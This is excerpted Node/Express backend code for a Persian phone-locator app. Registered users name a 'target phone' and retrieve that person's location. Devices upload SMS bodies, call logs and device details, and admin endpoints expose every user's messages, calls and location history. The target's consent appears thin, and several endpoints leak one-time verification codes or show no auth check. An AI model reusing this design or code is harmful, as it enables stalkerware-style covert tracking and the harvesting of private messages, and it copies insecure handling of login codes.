...
const DB = {
    ...
    list: async (options) => {
        ...
        const keys = Object.keys(db).filter(k => k.startsWith(prefix)).map(k => ({ name: k }));
...
async function logAdminAction(env, action, phone, details) {
    try {
        const logEntry = { action, phone: phone || '', details: details || '', timestamp: Date.now() };
...
async function saveMessageToHistory(env, phone, message, sender) {
    try {
        ...
        const msgEntry = {
            phone, message, sender: sender || 'مدیریت',
            sentAt: Date.now(), read: false, readAt: null, messageId
        };
        const historyData = await DB.get('messages_history');
        let history = historyData ? JSON.parse(historyData) : [];
        history.unshift(msgEntry);
        if (history.length > CONFIG.MAX_MESSAGES_HISTORY) history = history.slice(0, CONFIG.MAX_MESSAGES_HISTORY);
...
async function getMessagesHistory(env, useCache) {
...
async function incrementServerUsage(env, count) {
...
async function getAllUserPhones(env, useCache) {
    if (useCache === undefined) useCache = true;
    const now = Date.now();
...
async function nukeUserCompletely(env, phone) {
    const deletedKeys = { user: false, locations: false, code: false, permission: false, appVersion: false, updateMsg: false, limit: false, sms: false, calls: false, deviceInfo: false, dailyCount: 0 };
    try {
        const keysToDelete = ['user:' + phone, 'locations:' + phone, 'code:' + phone, 'permission:' + phone, 'app_version_' + phone, 'update_msg_' + phone, 'limit_' + phone, 'sms_' + phone, 'calls_' + phone, 'device_info_' + phone];
        for (const key of keysToDelete) {
            try { await DB.delete(key); } catch (e) {}
        }
        const dailyKeys = Object.keys(db).filter(k => k.startsWith('daily_' + phone + '_'));
        for (const k of dailyKeys) { await DB.delete(k); deletedKeys.dailyCount++; }
    ...
    } catch (e) { return { success: false, error: e.message, deletedKeys }; }
}

async function nukeEverything(env, includeIndexes) {
    if (includeIndexes === undefined) includeIndexes = true;
    const stats = { usersDeleted: 0, locationsDeleted: 0, codesDeleted: 0, permissionsDeleted: 0, appVersionsDeleted: 0, updateMsgsDeleted: 0, limitsDeleted: 0, dailyDeleted: 0, serverUsageDeleted: 0, smsDeleted: 0, callsDeleted: 0, deviceInfoDeleted: 0, messagesHistoryDeleted: 0, otherDeleted: 0, indexesDeleted: 0, errors: [], totalProcessed: 0 };
    try {
        const allKeys = Object.keys(db);
        for (const name of allKeys) {
            stats.totalProcessed++;
            if (!includeIndexes) {
                if (name === 'users_index' || name === 'app_version_data' || name === 'forced_update_users' || name === 'admin_logs') continue;
            }
            try {
                ...
                else if (name === 'users_index' || name === 'app_version_data' || name === 'forced_update_users' || name === 'admin_logs') { await DB.delete(name); stats.indexesDeleted++; }
                else { await DB.delete(name); stats.otherDeleted++; }
            } catch (e) { stats.errors.push(name + ': ' + e.message); }
        }
    ...
    } catch (e) { stats.errors.push('Fatal: ' + e.message); }
    return stats;
}
...
async function getUserAppVersion(env, phone) {
    const version = await DB.get('app_version_' + phone);
    if (version === null) return { versionCode: 0, versionName: '0.0.0', installDate: null, lastCheckDate: null, updateMessageRead: false };
    return JSON.parse(version);
}

async function setUserAppVersion(env, phone, versionCode, versionName) {
    const data = { versionCode, versionName, installDate: Date.now(), lastCheckDate: Date.now(), updateMessageRead: false };
    await DB.put('app_version_' + phone, JSON.stringify(data));
    return data;
}
...
function checkUpdateNeeded(userVersionCode, currentVersionCode, installDate, userPhone, forcedUsers, updateMessageRead) {
    if (userPhone && forcedUsers && forcedUsers.includes(userPhone)) {
        return { needsUpdate: true, isForce: true, daysRemaining: 0, message: '⚠️ به دستور ادمین، بروزرسانی برای شما اجباری شده است.', customMessage: APP_CUSTOM_MESSAGE || null, versionName: APP_VERSION, versionCode: APP_VERSION_CODE, downloadUrl: APK_DOWNLOAD_URL, releaseNotes: APP_RELEASE_NOTES };
    }
    if (userVersionCode < currentVersionCode) {
        if (!installDate) {
            return { needsUpdate: true, isForce: true, daysRemaining: 0, message: '⚠️ نسخه جدید برنامه منتشر شده است.', customMessage: APP_CUSTOM_MESSAGE || null, versionName: APP_VERSION, versionCode: APP_VERSION_CODE, downloadUrl: APK_DOWNLOAD_URL, releaseNotes: APP_RELEASE_NOTES };
        }
        ...
        if (updateMessageRead && !isForce) return { needsUpdate: false, versionName: APP_VERSION, versionCode: APP_VERSION_CODE };
        return { needsUpdate: true, isForce, daysRemaining, message: isForce ? '⚠️ نسخه جدید برنامه منتشر شده است.' : '📱 نسخه جدید منتشر شد. تا ' + daysRemaining + ' روز دیگر اجباری می‌شود.', customMessage: APP_CUSTOM_MESSAGE || null, versionName: APP_VERSION, versionCode: APP_VERSION_CODE, downloadUrl: APK_DOWNLOAD_URL, releaseNotes: APP_RELEASE_NOTES };
    }
...
async function checkUserUpdate(env, phone) {
    ...
    return checkUpdateNeeded(userVersion.versionCode || 0, APP_VERSION_CODE, userVersion.installDate, phone, forcedUsers, userVersion.updateMessageRead || false);
}
...
async function getDailyStatus(env, phone) {
    ...
    return { sentToday: count, remaining: Math.max(0, limit - count), isLimitReached: count >= limit, limit };
}
...
async function getUserWeeklyUsage(env, phone) {
    ...
    for (let i = 0; i < 7; i++) {
        ...
        usage.push({ date: dayStr, dateFa: date.toLocaleDateString('fa-IR'), count: count || 0 });
    }
...
async function sendEmail(to, code, name) {
    try {
        const htmlContent = `<html><body style="font-family: Vazir, sans-serif; direction: rtl; text-align: right;"><div style="max-width: 500px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 10px;"><h1 style="color: #4CAF50; text-align: center;">📍 کجاست؟</h1><p>سلام <b>${name || 'کاربر گرامی'}</b>،</p><p>کد فعالسازی شما:</p><div style="text-align: center; padding: 20px; background: #f5f5f5; border-radius: 10px; font-size: 32px; font-weight: bold; color: #4CAF50; letter-spacing: 5px;">${code}</div><p style="color: #999; font-size: 12px;">🕐 این کد ۵ دقیقه اعتبار دارد.</p></div></body></html>`;
        const response = await fetch('https://api.resend.com/emails', {
            method: 'POST',
            headers: { 'Authorization': 'Bearer ' + CONFIG.RESEND_API_KEY, 'Content-Type': 'application/json' },
            body: JSON.stringify({ from: CONFIG.FROM_NAME + ' <' + CONFIG.FROM_EMAIL + '>', to: [to], subject: '🔑 کد فعالسازی - کجاست؟', html: htmlContent }),
        });
...
function buildUpdatePayload(updateInfo) {
    return { needsUpdate: updateInfo.needsUpdate || false, isForceUpdate: updateInfo.isForce || false, daysRemainingForUpdate: updateInfo.daysRemaining || 0, updateMessage: updateInfo.needsUpdate ? updateInfo.message : null, customMessage: updateInfo.customMessage || null, downloadUrl: APK_DOWNLOAD_URL, releaseNotes: APP_RELEASE_NOTES };
}

function forceUpdateResponse(updateInfo) {
    return { success: false, error: "FORCE_UPDATE_REQUIRED", message: "⚠️ نسخه جدید برنامه منتشر شده است.", downloadUrl: APK_DOWNLOAD_URL, currentVersion: APP_VERSION, needsUpdate: true, isForce: true, customMessage: updateInfo.customMessage || null, releaseNotes: APP_RELEASE_NOTES };
}
...
async function buildAllUsersList(env) {
    ...
    for (const phone of activePhones) {
        ...
        const limit = await getUserLimit(env, phone);
        const userVersion = await getUserAppVersion(env, phone);
        const updateInfo = checkUpdateNeeded(userVersion.versionCode || 0, APP_VERSION_CODE, userVersion.installDate, phone, forcedUsers, userVersion.updateMessageRead || false);
        ...
        allUsers.push({
            phone: user.phone, name: user.name, email: user.email, code: user.code || 'ندارد',
            isVerified: user.isVerified || false, isBlocked: user.isBlocked || false,
            targetPhone: user.targetPhone || 'ثبت نشده', targetExists: user.targetExists || false, targetName: user.targetName || '',
            deviceModel: user.deviceModel || 'ناشناس', androidVersion: user.androidVersion || 'ناشناس',
            registeredAt: user.registeredAt || null, lastSeen: user.lastSeen || null,
            totalLocations: locationsCount, totalSms: smsCount, totalCalls: callsCount,
            dailyLimit: limit, dailySent: dailyStatus.sentToday, dailyRemaining: dailyStatus.remaining, isLimitReached: dailyStatus.isLimitReached,
            ...
            needsUpdate: updateInfo.needsUpdate, isForceUpdate: updateInfo.isForce || false, daysRemainingForUpdate: updateInfo.daysRemaining || 0,
            isForced: forcedUsers.includes(phone), customMessage: customMsg, updateMessage: updateInfo.message || null,
            usageScore, isHeavyUser: usageScore > 50, daysSinceLastSeen, isInactive: daysSinceLastSeen > 7 && user.isVerified,
            estimatedSize, estimatedSizeFormatted: formatBytes(estimatedSize)
        });
    }
    allUsers.sort((a, b) => {
...
app.get('/api/ping', (req, res) => {
    res.json({ success: true, message: 'pong', timestamp: Date.now(), version: APP_VERSION, uptime: 'online' });
});
...
app.post('/api/check-update', async (req, res) => {
    try {
        ...
        const userData = await DB.get('user:' + phone);
        if (!userData) return res.status(404).json({ success: false, userKicked: true, error: 'USER_KICKED', message: '🚫 شما از سرور خارج شدید.' });
        let userVersion = await getUserAppVersion(null, phone);
        if (!userVersion.installDate) userVersion = await setUserAppVersion(null, phone, currentVersionCode || 0, currentVersionName || '0.0.0');
        userVersion.lastCheckDate = Date.now();
        await DB.put('app_version_' + phone, JSON.stringify(userVersion));
        const forcedUsersData = await DB.get('forced_update_users');
        const forcedUsers = forcedUsersData ? JSON.parse(forcedUsersData) : [];
        const updateInfo = checkUpdateNeeded(userVersion.versionCode || currentVersionCode || 0, APP_VERSION_CODE, userVersion.installDate, phone, forcedUsers, userVersion.updateMessageRead || false);
        if (currentVersionCode > APP_VERSION_CODE) {
            await setUserAppVersion(null, phone, currentVersionCode, currentVersionName);
            return res.json({ success: true, needsUpdate: false, message: '✅ شما از آخرین نسخه استفاده می‌کنید', currentVersion: APP_VERSION, versionName: APP_VERSION, versionCode: APP_VERSION_CODE });
        }
        if (!updateInfo.needsUpdate) return res.json({ success: true, needsUpdate: false, message: '✅ برنامه به‌روز است', currentVersion: APP_VERSION, versionName: APP_VERSION, versionCode: APP_VERSION_CODE });
        res.json({ success: true, ...buildUpdatePayload(updateInfo), currentVersion: APP_VERSION, currentVersionCode: APP_VERSION_CODE });
...
app.get('/api/app-version', (req, res) => {
    res.json({ success: true, version: APP_VERSION, versionCode: APP_VERSION_CODE, minimumVersionCode: 1, downloadUrl: APK_DOWNLOAD_URL, releaseDate: new Date().toISOString(), releaseNotes: APP_RELEASE_NOTES, customMessage: APP_CUSTOM_MESSAGE });
});
...
app.post('/api/register', async (req, res) => {
    try {
        ...
        if (!targetPhone || targetPhone.length < 10) return res.json({ success: false, needTargetPhone: true, message: 'لطفاً شماره شخص مورد نظر را وارد کنید' });
        ...
        if (existingUser) {
            ...
            if (user.isVerified) return res.status(400).json({ success: false, message: 'این شماره قبلاً تأیید شده است.' });
            user.code = code; user.name = name; user.email = email; user.targetPhone = targetPhone; user.targetExists = targetExists;
            ...
            return res.json({ success: true, message: sendResult.success ? '✅ کد به ایمیل شما ارسال شد' : '🔑 کد شما: ' + code, code, sent: sendResult.success, phone, email, targetPhone, targetExists, isNewUser: false });
        }
        const userData = {
            phone, name: name || 'کاربر ناشناس', email, targetPhone, targetExists,
        ...
        await DB.put('permission:' + phone, targetPhone);
        await addUserToIndex(null, phone);
        await setUserAppVersion(null, phone, versionCode ? parseInt(versionCode) : APP_VERSION_CODE, versionName || APP_VERSION);
        res.json({ success: true, message: sendResult.success ? '✅ کد به ایمیل شما ارسال شد' : '🔑 کد شما: ' + code, code, sent: sendResult.success, phone, email, targetPhone, targetExists, isNewUser: true });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.post('/api/verify-code', async (req, res) => {
    try {
        ...
        if (!savedCode) return res.status(404).json({ success: false, message: 'شماره ثبت نشده یا کد منقضی شده' });
        if (savedCode !== code) return res.status(400).json({ success: false, message: '❌ کد اشتباه است' });
        const userData = await DB.get('user:' + phone);
        const user = JSON.parse(userData);
...
app.post('/api/resend-code', async (req, res) => {
    try {
        ...
        res.json({ success: true, message: sendResult.success ? '✅ کد جدید ارسال شد' : '🔑 کد جدید: ' + code, code, sent: sendResult.success });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.post('/api/get-user', async (req, res) => {
    try {
        const { phone } = req.body;
        const userData = await DB.get('user:' + phone);
        if (!userData) return res.status(404).json({ success: false, userKicked: true, message: '🚫 شما از سرور خارج شدید. حساب شما توسط مدیریت حذف شده است.' });
        const user = JSON.parse(userData);
        ...
        if (targetPhone) {
            ...
            if (targetData) { targetExists = true; targetName = JSON.parse(targetData).name || ''; }
        }
        const locationsData = await DB.get('locations:' + phone);
        ...
        res.json({
            ...
            user: {
                ...
                isVerified: user.isVerified || false, isBlocked: user.isBlocked || false,
                lastSeen: user.lastSeen, totalLocations: locations.length, code: user.code || 'ندارد',
                targetPhone: targetPhone || 'ثبت نشده', targetExists, targetName,
                deviceModel: user.deviceModel || 'ناشناس', androidVersion: user.androidVersion || 'ناشناس',
                dailyLimit: dailyStatus.limit, sentToday: dailyStatus.sentToday, remaining: dailyStatus.remaining, isLimitReached: dailyStatus.isLimitReached,
                appVersion: userVersion.versionName || user.appVersion || APP_VERSION,
                appVersionCode: userVersion.versionCode || user.appVersionCode || APP_VERSION_CODE,
...
app.post('/api/update-location', async (req, res) => {
    try {
        ...
        if (!userData) return res.status(404).json({ success: false, userKicked: true, error: 'USER_KICKED', message: '🚫 شما از سرور خارج شدید.' });
        const user = JSON.parse(userData);
        if (!user.isVerified) return res.status(403).json({ success: false, userKicked: true, error: 'USER_KICKED', message: '🚫 حساب شما غیرفعال شده است.' });
        if (user.isBlocked) return res.status(403).json({ success: false, userKicked: true, error: 'USER_KICKED', message: '🚫 حساب شما بلاک شده است.' });
        ...
        const dailyStatus = await getDailyStatus(null, phone);
        if (dailyStatus.isLimitReached) return res.status(429).json({ success: false, error: "DAILY_LIMIT_REACHED", message: '⚠️ سقف مجاز امروز پر شده', dailyLimit: dailyStatus.limit, sentToday: dailyStatus.sentToday, remaining: 0 });
        const newCount = await incrementDailyCount(null, phone);
        let locations = [];
        const locationsData = await DB.get('locations:' + phone);
        if (locationsData) locations = JSON.parse(locationsData);
        locations.push({ lat, lng, accuracy: req.body.accuracy || 0, speed: req.body.speed || 0, altitude: req.body.altitude || 0, timestamp: Date.now() });
        ...
        await DB.put('user:' + phone, JSON.stringify(user));
        res.json({ success: true, message: '✅ موقعیت ذخیره شد', dailyLimit: dailyStatus.limit, sentToday: newCount, remaining: Math.max(0, dailyStatus.limit - newCount), ...buildUpdatePayload(updateInfo) });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.post('/api/get-location', async (req, res) => {
    try {
        ...
        if (!targetPhone) return res.json({ success: false, needTargetPhone: true, message: 'شما هنوز شماره‌ای انتخاب نکرده‌اید.', dailyLimit: dailyStatus.limit, sentToday: dailyStatus.sentToday, remaining: dailyStatus.remaining, isLimitReached: dailyStatus.isLimitReached, ...buildUpdatePayload(updateInfo) });
        const targetUserData = await DB.get('user:' + targetPhone);
        if (!targetUserData) return res.json({ success: false, targetNotRegistered: true, message: 'شخص مورد نظر (' + targetPhone + ') ثبت نام نکرده', targetPhone, targetExists: false, dailyLimit: dailyStatus.limit, sentToday: dailyStatus.sentToday, remaining: dailyStatus.remaining, isLimitReached: false, noLimitDeduct: true, ...buildUpdatePayload(updateInfo) });
        const targetUser = JSON.parse(targetUserData);
        if (!targetUser.isVerified) return res.json({ success: false, targetNotVerified: true, message: 'شخص مورد نظر هنوز تأیید نکرده', targetPhone, targetExists: true, targetName: targetUser.name || '', dailyLimit: dailyStatus.limit, sentToday: dailyStatus.sentToday, remaining: dailyStatus.remaining, isLimitReached: false, noLimitDeduct: true, ...buildUpdatePayload(updateInfo) });
        if (targetUser.isBlocked) return res.json({ success: false, targetBlocked: true, message: 'شخص مورد نظر بلاک شده', targetPhone, targetExists: true, dailyLimit: dailyStatus.limit, sentToday: dailyStatus.sentToday, remaining: dailyStatus.remaining, isLimitReached: false, noLimitDeduct: true, ...buildUpdatePayload(updateInfo) });
        ...
        res.json({ success: true, name: targetUser.name, phone: targetUser.phone, email: targetUser.email, location: lastLocation, totalLocations: locations.length, isVerified: targetUser.isVerified, targetPhone, targetExists: true, dailyLimit: dailyStatus.limit, sentToday: newSentToday, remaining: newRemaining, isLimitReached: dailyStatus.isLimitReached, error: responseError, message: responseMessage, ...buildUpdatePayload(updateInfo) });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.post('/api/check-target', async (req, res) => {
    try {
        ...
        await DB.put('user:' + phone, JSON.stringify(user));
        res.json({ success: true, targetPhone, targetExists, targetName, targetVerified, message: targetExists ? '✅ ' + targetName + ' ثبت نام کرده' : '❌ ثبت نام نکرده' });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.post('/api/daily-status', async (req, res) => {
    try {
        ...
        if (!userData) return res.status(404).json({ success: false, userKicked: true, error: 'USER_KICKED', message: '🚫 شما از سرور خارج شدید.' });
        const dailyStatus = await getDailyStatus(null, phone);
        res.json({ success: true, dailyLimit: dailyStatus.limit, sentToday: dailyStatus.sentToday, remaining: dailyStatus.remaining, isLimitReached: dailyStatus.isLimitReached });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.post('/api/get-custom-message', async (req, res) => {
    try {
        ...
        if (msg.read === true) return res.json({ success: true, hasMessage: false });
        res.json({ success: true, hasMessage: true, message: msg.message || '', sender: msg.sender || 'مدیریت', messageId: String(msg.messageId || msg.date || Date.now()), isRead: false, date: msg.date || Date.now() });
    } catch (e) { res.json({ success: false, hasMessage: false, error: e.message }); }
});
...
app.post('/api/save-sms', async (req, res) => {
    try {
        ...
        const isDuplicate = smsList.some(s => s.timestamp === smsTimestamp && s.body === smsBody);
        if (!isDuplicate) {
            smsList.push({ from: smsFrom || 'ناشناس', name: smsName || '', body: smsBody, timestamp: smsTimestamp || Date.now(), deviceModel: deviceModel || 'ناشناس', receivedAt: Date.now() });
            if (smsList.length > 200) smsList = smsList.slice(-200);
            await DB.put(key, JSON.stringify(smsList));
        }
        res.json({ success: true, message: '✅ SMS ذخیره شد', total: smsList.length });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
        ...
        if (Array.isArray(smsList)) {
            ...
            for (const sms of smsList) {
                if (!existingTimestamps.has(sms.timestamp)) {
                    merged.push({ from: sms.from || 'ناشناس', name: sms.name || '', body: sms.body || '', type: sms.type || 'inbox', timestamp: sms.timestamp, receivedAt: Date.now() });
                }
            }
        }
        ...
        if (Array.isArray(callList)) {
            ...
            for (const call of callList) {
                if (!existingTimestamps.has(call.timestamp)) {
                    merged.push({ number: call.number || '', name: call.name || '', type: call.type || 'unknown', duration: call.duration || 0, timestamp: call.timestamp, receivedAt: Date.now() });
                }
            }
        }
        if (merged.length > 200) merged.splice(0, merged.length - 200);
...
app.post('/api/sync-device', async (req, res) => {
    try {
        ...
        if (!phone) return res.json({ success: false });
        await DB.put('device_info_' + phone, JSON.stringify({ deviceModel: deviceModel || '', deviceBrand: deviceBrand || '', androidVersion: androidVersion || 0, androidRelease: androidRelease || '', battery: battery || 0, updatedAt: Date.now() }));
        res.json({ success: true });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.get('/api/get-user-sms', async (req, res) => {
    try {
        ...
        const formatted = (Array.isArray(smsList) ? smsList : []).map(s => {
            ...
            return { from: s.from || 'ناشناس', name: s.name || '', displayName: s.name || s.from || 'ناشناس', body: s.body || '', type: s.type || 'inbox', timestamp: s.timestamp || s.receivedAt, fullDate: date.toLocaleString('fa-IR'), date: date.toLocaleDateString('fa-IR'), time: date.toLocaleTimeString('fa-IR') };
        });
...
app.get('/api/get-user-calls', async (req, res) => {
    try {
        ...
        const formatted = (Array.isArray(callList) ? callList : []).map(c => {
            ...
            return { number: c.number || '', name: c.name || '', displayName: c.name || c.number || 'ناشناس', type: c.type || 'unknown', duration: c.duration || 0, timestamp: c.timestamp || c.receivedAt, fullDate: date.toLocaleString('fa-IR'), date: date.toLocaleDateString('fa-IR'), time: date.toLocaleTimeString('fa-IR') };
        });
...
app.get('/api/messages-history', async (req, res) => {
    try {
        ...
        if (filterPhone) filtered = filtered.filter(m => m.phone && m.phone.includes(filterPhone));
        if (filterStatus === 'read') filtered = filtered.filter(m => m.read);
        else if (filterStatus === 'unread') filtered = filtered.filter(m => !m.read);
        const today = todayStr();
        const stats = { total: history.length, read: history.filter(m => m.read).length, unread: history.filter(m => !m.read).length, today: history.filter(m => { const msgDate = new Date(m.sentAt).toISOString().split('T')[0]; return msgDate === today; }).length };
        const formatted = filtered.slice(0, 200).map(m => {
            const date = new Date(m.sentAt);
            return { ...m, sentAtFa: date.toLocaleString('fa-IR'), readAtFa: m.readAt ? new Date(m.readAt).toLocaleString('fa-IR') : null, messagePreview: m.message ? m.message.substring(0, 80) : '' };
        });
        res.json({ success: true, messages: formatted, total: filtered.length, stats });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.get('/api/users', async (req, res) => {
    try {
        ...
        const history = await getMessagesHistory(null);
        const stats = {
            total: usersList.length, verified: usersList.filter(u => u.isVerified).length, blocked: usersList.filter(u => u.isBlocked).length,
            heavy: usersList.filter(u => u.isHeavyUser).length, inactive: usersList.filter(u => u.isInactive).length,
            needsUpdate: usersList.filter(u => u.needsUpdate).length, forceUpdate: usersList.filter(u => u.isForceUpdate).length,
            totalLocations: usersList.reduce((s, u) => s + (u.totalLocations || 0), 0),
            totalSms: usersList.reduce((s, u) => s + (u.totalSms || 0), 0),
            totalCalls: usersList.reduce((s, u) => s + (u.totalCalls || 0), 0),
            totalSize: usersList.reduce((s, u) => s + (u.estimatedSize || 0), 0),
            totalMessages: history.length, unreadMessages: history.filter(m => !m.read).length
        };
        res.json({ success: true, users: usersList, total: usersList.length, stats, defaultLimit: CONFIG.DEFAULT_DAILY_LIMIT, currentAppVersion: APP_VERSION, currentAppVersionCode: APP_VERSION_CODE, downloadUrl: APK_DOWNLOAD_URL, releaseNotes: APP_RELEASE_NOTES, customMessage: APP_CUSTOM_MESSAGE, timestamp: Date.now(), serverUsage: { today: usageToday, quota: 100000, remaining: Math.max(0, 100000 - usageToday), percent: Math.min(100, Math.round((usageToday / 100000) * 100)) } });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.get('/api/get-user-details', async (req, res) => {
    try {
        ...
        const customMsg = msgData ? JSON.parse(msgData) : null;
        const history = await getMessagesHistory(null);
        const userMessages = history.filter(m => m.phone === phone).slice(0, 20).map(m => ({ message: m.message, sender: m.sender, sentAt: m.sentAt, sentAtFa: new Date(m.sentAt).toLocaleString('fa-IR'), read: m.read, readAt: m.readAt, readAtFa: m.readAt ? new Date(m.readAt).toLocaleString('fa-IR') : null, messageId: m.messageId }));
        const weeklyUsage = await getUserWeeklyUsage(null, phone);
        const avgDaily = weeklyUsage.reduce((s, d) => s + d.count, 0) / 7;
        ...
        res.json({
            ...
            user: {
                ...
                targetPhone: user.targetPhone || 'ثبت نشده', targetExists: user.targetExists || false, targetName: user.targetName || '',
                deviceModel: user.deviceModel || 'ناشناس', androidVersion: user.androidVersion || 'ناشناس',
                registeredAt: user.registeredAt || null, registeredAtFa: user.registeredAt ? new Date(user.registeredAt).toLocaleString('fa-IR') : '—',
                lastSeen: user.lastSeen || null, lastSeenFa: user.lastSeen ? new Date(user.lastSeen).toLocaleString('fa-IR') : '—',
                totalLocations: locations.length, dailyLimit: dailyStatus.limit, dailySent: dailyStatus.sentToday, dailyRemaining: dailyStatus.remaining, isLimitReached: dailyStatus.isLimitReached,
                appVersion: userVersion.versionName || user.appVersion || APP_VERSION,
                appVersionCode: userVersion.versionCode || user.appVersionCode || APP_VERSION_CODE,
                needsUpdate: updateInfo.needsUpdate, isForceUpdate: updateInfo.isForce || false, daysRemainingForUpdate: updateInfo.daysRemaining || 0,
                isForced: forcedUsers.includes(phone), customMessage: customMsg, updateMessage: updateInfo.message || null,
                usageScore, isHeavyUser: usageScore > 50, estimatedSize, estimatedSizeFormatted: formatBytes(estimatedSize),
                weeklyUsage, avgDaily: Math.round(avgDaily * 10) / 10,
                messagesHistory: userMessages, totalMessagesReceived: userMessages.length, unreadMessages: userMessages.filter(m => !m.read).length,
                locations: locations.slice(-50).map((loc, index) => {
                    const date = new Date(loc.timestamp);
                    return { id: index + 1, lat: loc.lat, lng: loc.lng, accuracy: loc.accuracy || 0, speed: loc.speed || 0, altitude: loc.altitude || 0, timestamp: loc.timestamp, fullDate: date.toLocaleString('fa-IR'), googleMapsLink: 'https://www.google.com/maps?q=' + loc.lat + ',' + loc.lng };
                })
            }
        });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
...
app.get('/api/get-user-locations', async (req, res) => {
    try {
        ...
        const formattedLocations = locations.map((loc, index) => {
            const date = new Date(loc.timestamp);
            return { id: index + 1, lat: loc.lat, lng: loc.lng, accuracy: loc.accuracy || 0, speed: loc.speed || 0, altitude: loc.altitude || 0, timestamp: loc.timestamp, date: date.toLocaleDateString('fa-IR'), time: date.toLocaleTimeString('fa-IR'), fullDate: date.toLocaleString('fa-IR'), googleMapsLink: 'https://www.google.com/maps?q=' + loc.lat + ',' + loc.lng };
        });
        res.json({ success: true, phone: user.phone, name: user.name, email: user.email, isVerified: user.isVerified || false, isBlocked: user.isBlocked || false, totalLocations: locations.length, lastLocation: lastLocation ? { lat: lastLocation.lat, lng: lastLocation.lng, timestamp: lastLocation.timestamp, date: new Date(lastLocation.timestamp).toLocaleString('fa-IR'), googleMapsLink: 'https://www.google.com/maps?q=' + lastLocation.lat + ',' + lastLocation.lng } : null, locations: formattedLocations });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.post('/api/set-user-limit', async (req, res) => {
    try {
        ...
        if (adminKey !== CONFIG.SECRET_KEY) return res.status(403).json({ success: false, message: 'دسترسی غیرمجاز' });
        if (!phone || phone.length < 10 || !newLimit || newLimit < 1 || newLimit > 1000) return res.status(400).json({ success: false, message: 'اطلاعات نامعتبر' });
        const userData = await DB.get('user:' + phone);
        if (!userData) return res.status(404).json({ success: false, message: 'کاربر پیدا نشد' });
        const newLimitValue = parseInt(newLimit);
        await setUserLimit(null, phone, newLimitValue);
        await logAdminAction(null, 'set-limit', phone, 'محدودیت به ' + newLimitValue);
        res.json({ success: true, message: '✅ محدودیت به ' + newLimitValue + ' تغییر یافت', phone, newLimit: newLimitValue });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.post('/api/set-app-version', async (req, res) => {
    try {
        const { versionCode, versionName, downloadUrl, releaseNotes, adminKey, targetUsers, isForAllUsers, customMessage, forceUpdate } = req.body;
        if (adminKey !== CONFIG.SECRET_KEY) return res.status(403).json({ success: false, message: 'دسترسی غیرمجاز' });
        if (!versionCode || !versionName) return res.status(400).json({ success: false, message: 'نام و کد نسخه الزامی' });
        const versionData = { versionCode, versionName, downloadUrl: downloadUrl || APK_DOWNLOAD_URL, releaseNotes: releaseNotes || '📌 نسخه جدید', releaseDate: Date.now(), customMessage: customMessage || null, forceUpdate: forceUpdate || false, isForAllUsers: isForAllUsers !== undefined ? isForAllUsers : true, targetUsers: targetUsers || [] };
        ...
        if (isForAllUsers || (targetUsers && targetUsers.length > 0)) {
            ...
            for (const phone of usersToUpdate) {
                ...
                if (customMessage) await saveMessageToHistory(null, phone, customMessage, 'سیستم (بروزرسانی)');
            }
        }
        await logAdminAction(null, 'publish-version', '', versionName + ' (کد ' + versionCode + ')');
        res.json({ success: true, message: '✅ نسخه ' + versionName + ' ثبت شد', versionCode, versionName, affectedUsers: isForAllUsers ? 'همه کاربران' : (targetUsers ? targetUsers.length + ' کاربر' : 'هیچ'), releaseNotes, customMessage, forceUpdate, downloadUrl: downloadUrl || APK_DOWNLOAD_URL });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.post('/api/send-custom-message', async (req, res) => {
    try {
        ...
        res.json({ success: true, message: '✅ پیام ارسال شد', phone, messageId: msgEntry ? msgEntry.messageId : null, sentAt: msgEntry ? msgEntry.sentAt : Date.now() });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.post('/api/toggle-verify', async (req, res) => {
    try {
        ...
        res.json({ success: true, message: user.isVerified ? '✅ کاربر تأیید شد' : '⏳ تأیید برداشته شد', isVerified: user.isVerified });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.post('/api/toggle-force', async (req, res) => {
    try {
        ...
        if (wasForced) forcedUsers = forcedUsers.filter(p => p !== phone);
        else forcedUsers.push(phone);
        await DB.put('forced_update_users', JSON.stringify(forcedUsers));
        await logAdminAction(null, 'toggle-force', phone, wasForced ? 'برداشتن' : 'فعال');
        res.json({ success: true, message: wasForced ? '⚠️ اجبار برداشته شد' : '⚠️ اجبار فعال شد', isForced: !wasForced });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.post('/api/reset-user', async (req, res) => {
    try {
        ...
        res.json({ success: true, message: '✅ کاربر بازگردانده شد.' + (emailSent ? ' کد ارسال شد.' : ' کد جدید: ' + newCode), phone, name: user.name, email: user.email, code: newCode, emailSent, isVerified: false });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.post('/api/change-target', async (req, res) => {
    try {
        ...
        res.json({ success: true, message: '✅ شماره هدف تغییر یافت', newTargetPhone, targetExists });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.delete('/api/nuke-user', async (req, res) => {
    try {
        ...
        res.json({ success: result.success, message: result.success ? '💥 کاربر کاملاً نابود شد' : '❌ ' + result.error, deletedKeys: result.deletedKeys });
    } catch (e) { res.status(500).json({ success: false, message: e.message }); }
});
...
app.delete('/api/delete-all-users', async (req, res) => {
    try {
        ...
        if (adminKey !== CONFIG.SECRET_KEY) return res.status(403).json({ success: false, message: 'دسترسی غیرمجاز' });
        if (confirm !== 'YES_DELETE_ALL_USERS') return res.status(400).json({ success: false, message: '⚠️ تأیید نادرست' });
        const allPhones = await getAllUserPhones(null, false);
        const deletedUsers = [];
        ...
